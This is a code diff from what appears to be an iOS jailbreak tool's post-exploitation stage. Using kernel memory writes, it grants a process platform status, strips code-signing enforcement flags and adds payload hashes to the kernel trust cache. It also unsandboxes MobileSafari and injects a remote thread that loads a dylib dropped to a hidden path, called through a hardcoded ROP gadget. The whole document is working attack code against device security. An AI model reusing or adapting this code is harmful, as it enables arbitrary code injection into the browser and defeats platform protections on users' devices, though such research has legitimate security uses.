@@ -61,18 +61,18 @@ void unsandbox(uint64_t proc) {
 void platformize(uint64_t proc) {
     uint64_t task = kernel_read64(proc + OFFSET(proc, task));
     uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
-#define TF_PLATFORM        0x00000400   // task is a platform binary
+    #define TF_PLATFORM        0x00000400   // task is a platform binary
     kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);
 
     //patch csflags
     uint32_t csflags = kernel_read32(proc + OFFSET(proc, p_csflags));
-#define CS_PLATFORM_BINARY 0x4000000    // this is a platform binary
-#define CS_INSTALLER       0x0000008    // has installer entitlement
-#define CS_GET_TASK_ALLOW  0x0000004    // has get-task-allow entitlement
-#define CS_DEBUGGED        0x10000000   // process is currently or has previously been debugged and allowed to run with invalid pages
-#define CS_RESTRICT        0x0000800    // tell dyld to treat restricted
-#define CS_HARD            0x0000100    // don't load invalid pages
-#define CS_KILL            0x0000200    // kill process if it becomes invalid
+    #define CS_PLATFORM_BINARY 0x4000000    // this is a platform binary
+    #define CS_INSTALLER       0x0000008    // has installer entitlement
+    #define CS_GET_TASK_ALLOW  0x0000004    // has get-task-allow entitlement
+    #define CS_DEBUGGED        0x10000000   // process is currently or has previously been debugged and allowed to run with invalid pages
+    #define CS_RESTRICT        0x0000800    // tell dyld to treat restricted
+    #define CS_HARD            0x0000100    // don't load invalid pages
+    #define CS_KILL            0x0000200    // kill process if it becomes invalid
     csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
     kernel_write32(proc + OFFSET(proc, p_csflags), csflags);
 }
@@ -130,8 +130,8 @@ void trust_hashes(hash_t *hashes, size_t count) {
         mach_vm_address_t kernel_trust;
         kern_return_t kr = mach_vm_allocate(kernel_task_port, &kernel_trust, cache_size, VM_FLAGS_ANYWHERE);
         if (kr != KERN_SUCCESS) {
-          printf("mach_vm_allocate returned %d: %s\n", kr, mach_error_string(kr));
-          return;
+            printf("mach_vm_allocate returned %d: %s\n", kr, mach_error_string(kr));
+            return;
         }
         printf("[*] allocated: 0x%zx => 0x%llx\n", cache_size, kernel_trust);
 
@@ -214,92 +214,54 @@ void alert(uint64_t self_proc) {
         "_" #sym "_end:\n"                  /* Define the object size */\
         ".balign 4\n"                       /* Word alignment */\
         ".text\n")                          /* Restore section */
-    IMPORT_BIN("loader.bin", loader);
     IMPORT_BIN("payload.dylib", payload);
 
+    const char *payload_path = "/var/containers/Bundle/.jailbreakme.dylib";
+    FILE *payload = fopen(payload_path, "wb");
+    if (payload == NULL) {
+        fprintf(stderr, "Unable to create payload. Cannot continue!\n");
+        return;
+    }
+    extern const uint8_t payload_start, payload_end;
+    const uint8_t *start = &payload_start, *end = &payload_end;
+    fwrite(start, 1, end - start, payload);
+    fclose(payload);
+
     #define STACK_SIZE   0x8000
-    #define LOADER_SIZE  0x8000
-    #define PAYLOAD_SIZE 0x1000000
 
     uint64_t proc = proc_of_procName("MobileSafari");
     if (proc == 0) {
-      fprintf(stderr, "Unable to get proc of MobileSafari. Cannot continue!\n");
-      return;
+        fprintf(stderr, "Unable to get proc of MobileSafari. Cannot continue!\n");
+        return;
     }
-    fprintf(stderr, "proc of MobileSafari: 0x%llx\n", proc);
+    fprintf(stderr, "pid of MobileSafari: %d\n", kernel_read32(proc + OFFSET(proc, p_pid)));
+
+    unsandbox(proc);
 
     task_t remote_task = task_for_proc(self_proc, proc);
     if (remote_task == MACH_PORT_NULL) {
-      fprintf(stderr, "Unable to get task for MobileSafari. Cannot continue!\n");
-      return;
+        fprintf(stderr, "Unable to get task for MobileSafari. Cannot continue!\n");
+        return;
     }
 
     mach_vm_address_t remote_stack = (vm_address_t)NULL;
     kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
-      fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-      return;
+        fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+        return;
     }
     fprintf(stderr, "Allocated remote stack @0x%llx\n", remote_stack);
 
-    mach_vm_address_t remote_loader = (vm_address_t)NULL;
-    kr = mach_vm_allocate(remote_task, &remote_loader, LOADER_SIZE, VM_FLAGS_ANYWHERE);
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to allocate memory for remote loader in thread: Error %s\n", mach_error_string(kr));
-        return;
-    }
-    fprintf(stderr, "Allocated remote loader @0x%llx\n", remote_loader);
-
-    mach_vm_address_t remote_payload = (vm_address_t)NULL;
-    kr = mach_vm_allocate(remote_task, &remote_payload, PAYLOAD_SIZE, VM_FLAGS_ANYWHERE);
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to allocate memory for remote payload in thread: Error %s\n", mach_error_string(kr));
-        return;
-    }
-    fprintf(stderr, "Allocated remote payload @0x%llx\n", remote_payload);
-
-    mach_vm_address_t remote_buffer = (vm_address_t)NULL;
-    kr = mach_vm_allocate(remote_task, &remote_buffer, PAYLOAD_SIZE, VM_FLAGS_ANYWHERE);
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to allocate memory for remote buffer in thread: Error %s\n", mach_error_string(kr));
-        return;
-    }
-    fprintf(stderr, "Allocated remote buffer @0x%llx\n", remote_buffer);
-
-    extern const uint8_t loader_start, loader_end;
-    const uint8_t *start = &loader_start, *end = &loader_end;
-    uint64_t *loader = (uint64_t *)start;
-    loader[1] = remote_payload;                             // payload
-    loader[2] = (uint64_t)dlsym;                            // dlsym
-    loader[3] = 0;                                          // startOfFixedExecutableMemoryPool for WebKit, 0 for native
-    loader[4] = remote_buffer + PAYLOAD_SIZE;               // remote_buffer end
-    loader[5] = remote_loader + 4;                          // memcpyx
     kr = mach_vm_write(remote_task,                         // Task port
-                       remote_loader,                       // Virtual Address (Destination)
-                       (vm_address_t)start,                 // Source
-                       end - start);                        // Length of the source
+                       remote_stack + 8,                    // Virtual Address (Destination)
+                       (vm_address_t)payload_path,          // Source
+                       strlen(payload_path) + 1);           // Length of the source
     if (kr != KERN_SUCCESS) {
-      fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-      return;
-    }
-    kr = vm_protect(remote_task, remote_loader, LOADER_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr, "Unable to set memory permissions for remote thread: Error %s\n", mach_error_string(kr));
+        fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
         return;
     }
 
-    extern const uint8_t payload_start, payload_end;
-    start = &payload_start, end = &payload_end;
-    kr = mach_vm_write(remote_task,                         // Task port
-                       remote_payload,                      // Virtual Address (Destination)
-                       (vm_address_t)start,                 // Source
-                       end - start);                        // Length of the source
-    if (kr != KERN_SUCCESS) {
-      fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-      return;
-    }
-
-    uint64_t slide = (uint64_t)dlsym - 0x0180919a08;
+    uint64_t slide = (uint64_t)dlopen - 0x0180919858;
     uint64_t gadget = slide + 0x0180ae4830; // ret
     arm_thread_state64_t remote_thread_state64 = {0};
     remote_thread_state64.__lr = gadget;
@@ -307,8 +269,8 @@ void alert(uint64_t self_proc) {
     remote_thread_state64.__pc = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
     remote_thread_state64.__x[0] = (uint64_t)remote_stack; // pthread_t *thread
     remote_thread_state64.__x[1] = 0; // const pthread_attr_t *attr
-    remote_thread_state64.__x[2] = (uint64_t)remote_loader; // void *(*start_routine)(void *)
-    remote_thread_state64.__x[3] = 0; // void *arg
+    remote_thread_state64.__x[2] = (uint64_t)dlopen; // void *(*start_routine)(void *)
+    remote_thread_state64.__x[3] = (uint64_t)remote_stack + 8; // void *arg
 
     thread_act_t remote_thread;
     kr = thread_create_running(remote_task, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, ARM_THREAD_STATE64_COUNT , &remote_thread);
@@ -347,7 +309,7 @@ void drop_payload() {
     printf("uid: %d\n", getuid());
 
     hash_t hashes[] = {
-        {0x25, 0x06, 0xe0, 0xc5, 0x59, 0xc1, 0x1c, 0x97, 0x1a, 0xe4, 0x95, 0x01, 0x08, 0xd6, 0x6b, 0x9c, 0x0b, 0xcc, 0xc0, 0xdf}, // binbag
+        {0x25, 0x1e, 0xc7, 0x28, 0x71, 0xda, 0x7f, 0x0b, 0x07, 0x2f, 0xc0, 0x65, 0xad, 0x4a, 0x4a, 0x54, 0xc5, 0xbb, 0x88, 0xe8}, // payload
     };
     trust_hashes(hashes, sizeof(hashes) / sizeof(hash_t));
 
